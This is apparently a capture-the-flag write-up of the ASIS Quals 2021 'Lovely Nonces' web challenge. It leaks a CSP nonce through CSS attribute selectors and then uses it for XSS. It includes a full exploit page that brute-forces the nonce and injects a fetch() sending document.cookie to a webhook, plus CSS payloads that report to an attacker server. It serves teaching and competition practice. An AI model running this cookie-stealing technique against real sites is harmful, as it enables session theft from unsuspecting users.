---
layout: post
title: "[ASIS Quals 2021] Lovely Nonces"
author: Vie
---

Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. [Ming](https://ubcctf.github.io/authors/ming/) and I solved this challenge together. This writeup is the product of both of our work.

## TL;DR
CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.

## Recon

The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise. It's just one directive, `script-src`, with the randomly generated nonce value, which we can try to retrieve.

```
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-$NONCE$'">
```

(Note: it is also possible to extract this nonce from the `script` tag on the same page)

The cookie is set to the localhost domain - which is important moving forward with our exploit (we won't be injecting our payloads on the lovelynonce domain, it'll be on localhost). 

```js
await page.setCookie({
			name: 'flag',
			value: process.env.FLAG || "flag{fake-flag}",
			domain: "localhost",
			expires: now() + 1000
		})
```

On the HTML of the page is a location.hash navigator that sets an element in the HTML to the value of whatever `document.location.hash` was. 

```
    <script nonce="$NONCE$">
    	document.location.hash = "";
    	window.onhashchange = ()=>{
    		if(document.location.hash) {
          		desc.innerHTML = decodeURIComponent(document.location.hash.slice(1));
				document.location.hash = "";
        	}
    	};
    </script>
```

Test this out by appending `#%3Cp%3Etest%3C%2Fp%3E` (just the URLencoded version of `#<p>test</p>`) to the challenge webpage and see how this code snippet works. This is an easy XSS vector, but obviously the CSP isn't letting us do something so trivial as `#<script>alert(1337)</script>`.

There's a report function that actually utilizes this browser-side JS to add a report form in the webpage. 

## Exploit in Detail 

The location hash is a potential XSS vector. You can copy-paste the webpage's nonce value into an iframe with the srcdoc attribute and achieve XSS. 

```
<iframe srcdoc="<script nonce=[THEIR_NONCE]>alert(1)</script>"></iframe>
```

This works because iframes loaded with `srcdoc` aren't cross-origin. BUT, this also won't work for the challenge as the server generates unique nonces for each request, meaning that our nonce won't be the same nonce that the admin has when they load up our webpage with our iframe payload. The CSP is technically doing it's job, and even with the copy-pasted nonce and srcdoc iframe, this is just a self-XSS for now. Ideally, we want to find out the nonce of the webpage when the admin visits - and while they're still on the webpage, load up our iframe payload with the correct nonce.

Nonces implemented via the meta-tag, or nonces within the script-tag can be leaked through CSS attribute selectors. Setting the hash to: 

```
<style>*{display:block}meta[content^="script-src nonce-a"]{background-image:url("http://our-server/result?nonce=a");}</style>
```

or

```
<style>script[nonce^="a"]{display:block;background:url("http://our-server/result?nonce=a");}</style>
```

will send a request to our server in the event that any element with the right attribute stuck to it has a value starting with `script-src nonce-a`. We can extrapolate this further to brute-force each character in the attribute value and use fetches to our server to extract the correct 'next character' of the nonce.

If the CSS attribute selector successfully finds a tag that matches the above conditions, then a request is fired to our server. Otherwise, no request is made to our server.

To change the hash, we have the admin open a window to the vulnerable page (localhost:8000), identified by a name (
`open("http://localhost:8000/", "thisOneWindow")`), and after that, we can have the admin open a window with the same url, but with a different hash, and the same name (
`open("http://localhost:8000/#aaaaa", "thisOneWindow")`). The browser has this page cached, and as a result, we will still be using the same page, just with a different location hash.


## The exploit flow
The attack flow is as follows: 

1. Admin visits our server, hosting an index.html that will load the challenge page.

2. Iterating through the alphanumeric charset, the injected style tag in the hash tests for each char if it is in the nonce - and if so, sends a request back to our server.

3. That request is processed by our Node backend, which pushes the correctly guessed character into an internal array.

4. The JS in index.html (the browser JS) sets a short timeout and then tries to retrieve the value in that internal array from the backend, updating the nonce value guessed so far and testing the next char in line. 

5. This process repeats from step 2 until the entire nonce is leaked.

6. With the full nonce, we set the iframe payload with the correct, complete nonce value that dumps cookies back to our server.

7. Flag! 

![flag](/assets/images/asisquals2021/asislovelynonceflag.png)


## Relevant sources
* [Bypassing Nonces with DOM XSS](http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)
	* Explains how to use CSS attribute selectors to get nonce.
* [Penetration Testing Window Opener](https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d)
	* Explains how to exploit `location.hash`.
* Robert's brain
	* Found a way to inject a script tag that executes immediately even after the page has loaded.

## The index.html page that we used

```
<script>
    const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    const length = 16 // static length
    const ngrokURL = "put-your-own-ngrok-tunnel-here"
    const url = "http://localhost:8000/"
    const win = open(url, "thisOneWindow"); // opens in another window
    function find_nonce(str) {
        setTimeout(function() {
            if (str.length >= 16) {
                const finalNonce = str;
                //owo
                let finalPayload = `%3Ciframe%20srcdoc%3D%22%3Cscript%20nonce%3D%24%7BfinalNonce%7D%3Efetch(%27your-webhook-url%3Fowoooooo%3D%27%2B(document.cookie))%3B%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E` // URL-encoded-payload
                open(url + "#" + finalPayload, "thisOneWindow");
            } else {
                send_req_new(str); // set new hash
                do_the_thing(); // poll our server repeatedly for nonce discovered so far
            }
        }, 25)
    }

    function do_the_thing() {
        setTimeout(function() {
        fetch(ngrokURL + "/poll").then(resp => resp.text()).then(data => {
            if (!data.startsWith("No can do")) {
                return find_nonce(data); // repeat with newly discovered nonce
            } else {
                return do_the_thing(); // just repeat it lol
            }
        })
    }, 3)
    }

    function send_req_new(str) {
        setTimeout(function() {
            longPayload = ""
            for (char of charset) {
				// construct payload
                let payload = `script[nonce^="${str.toString() + char}"]{display:block;background:url("${ngrokURL}/result?nonce=${str.toString() + char}");}\r\n`
                longPayload += payload
            }
            longPayload = "<style>" + longPayload + "</style>"
            open(url + "#" + encodeURIComponent(longPayload), "thisOneWindow"); // set hash
        }, 0)
    }
    find_nonce(""); // start from here
</script>
```
